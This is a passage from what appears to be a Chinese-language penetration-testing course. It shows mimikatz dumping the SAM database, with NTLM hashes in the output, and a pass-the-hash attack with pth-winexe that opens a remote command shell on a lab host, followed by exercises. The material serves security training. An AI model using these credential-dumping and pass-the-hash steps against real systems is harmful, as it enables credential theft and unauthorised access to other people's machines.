
C:\> `C:\Tools\password_attacks\mimikatz.exe`

. . .

mimikatz # `privilege::debug`

Privilege '20' OK

mimikatz # `token::elevate`

Token Id : 0

User name : 

SID name : NT AUTHORITY\SYSTEM

740 {0;000003e7} 1 D 33697 NT AUTHORITY\SYSTEM S-1-5-18 (04g,2 lp)

Primary

-> Impersonated !

* Process Token : {0;0002e0fe} 1 F 3790250 corp\offsec S-1-5-21-3048852426-3234707088-723452474-1103 (12g,24p) Primary

* Thread Token : {0;000003e7} 1 D 3843067 NT AUTHORITY\SYSTEM S-1-5-18

(04g,21p) Impersonation (Delegation)

```
*列表 615 - 使用 mimikatz 准备转储 SAM 数据库*
```

> 值得注意的是，令牌模块可以列出（`token::list`）并使用（`token::elevate`）当前登录到该机器上所有用户的令牌，在某些情况下，这甚至可能是其他机器的管理员。

现在我们可以使用 `lsadump::sam` 来转储 SAM 数据库的内容：

```
mimikatz # lsadump::sam

Domain : CLIENT251

SysKey : 457154fe3c13064d8ce67ff93a9257cf

Local SID : S-1-5-21-342691779-1881636637-1944612440

SAMKey : 9b60bd58cdfd663166e8624f20a9a6e5

RID : 000001f4 (500)

User : Administrator

RID : 000001f5 (501)

User : Guest

RID : 000001f7 (503)

User : DefaultAccount

RID : 000001f8 (504)

User : WDAGUtilityAccount

Hash NTLM: 0c509cca8bcd12a26acfd1e508cb028

RID : 000003e9 (1001)

User : Offsec

Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
```

*列表 616 - 使用 mimikatz 转储 SAM 数据库*

我们可以看到，mimikatz 优雅且有效地按照要求转储了哈希值。

> 其他哈希转储工具，包括 `pwdump`、`fgdump`，[577] 以及 Windows Credential Editor (`wce`)[578] 在针对 Windows XP 和 Windows Server 2003 等旧版 Windows 操作系统时效果良好。

## 19.4.1.1 练习

（这些练习不要求提交报告）

- 1. 识别你的 Kali 系统中使用的密码哈希版本。
- 2. 使用 `mimikatz` 从你的 Windows 客户端上的 SAM 数据库中转储密码哈希。

## 19.4.2 在 Windows 中通过哈希传递

正如我们将在下一节中发现的那样，破解密码哈希可能非常耗时，如果没有强大的硬件支持，往往不可行。然而，有时我们可以利用基于 Windows 的密码哈希，而无需进行繁重的破解过程。

通过哈希传递（Pass-the-Hash，PtH）技术（发现于 1997 年）允许攻击者使用有效的用户名和 NTLM/LM 哈希值组合（而不是明文密码）对远程目标进行身份验证。这是可能的，因为 NTLM/LM 密码哈希值未加盐，并且在会话之间保持静态。此外，如果我们在一个目标上发现了密码哈希值，我们不仅可以将其用于对该目标进行身份验证，还可以将其用于对另一个目标进行身份验证，只要该目标具有相同用户名和密码的账户即可。

让我们引入一个场景来演示这种攻击。在我们的评估期间，我们发现在多个系统上启用了本地管理员账户。我们利用了其中一个系统上的漏洞并获得了 SYSTEM 权限，这使我们能够转储本地 LM 和 NTLM 哈希值。我们已经复制了本地管理员的 NTLM 哈希值，现在可以使用它代替密码来访问具有相同本地管理员账户和密码的另一台机器。

为此，我们将使用 Passing-The-Hash 工具包中的 `pth-winexe`[579]（`winexe` 的一个修改版本），它使用 SMB 协议进行身份验证：

```
kali@kali:~$ pth-winexe

winexe version 1.1

This program may be freely redistributed under the terms of the GNU GPLv3

Usage: winexe [OPTION]... //HOST COMMAND

Options:

-h, --help Display help message

-V, --version Display version number

-U, --user=[DOMAIN\]USERNAME[:PASSWORD] Set the network username

-A, --authentication-file=FILE Get the credentials from a file

...
```

*列表 617 - 显示 pth-winexe 的帮助对话框*

> 要使用 SMB 协议在远程计算机上执行 `cmd` 等应用程序，需要管理员权限。这是由于对管理共享 `C$` 的身份验证以及随后创建 Windows 服务所致。

作为演示，我们将在 Kali 机器上调用 `pth-winexe`，使用之前转储的密码哈希对目标进行身份验证。我们通过指定用户名和哈希值（`-U`）以及 SMB 共享（以 UNC 格式表示）和要执行的命令名称（在列表 618 中为 `cmd`）来获取目标机器上的远程命令提示符。我们将忽略 *DOMAIN* 参数，并在哈希值前加上用户名（后跟 % 符号）以完成命令。其语法略显复杂，如下所示：

```
kali@kali:~$ pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd

E_md4hash wrapper called.

HASH PASS: Substituting user supplied NTLM HASH...

Microsoft Windows [Version 10.0.16299.309]

(c) 2017 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
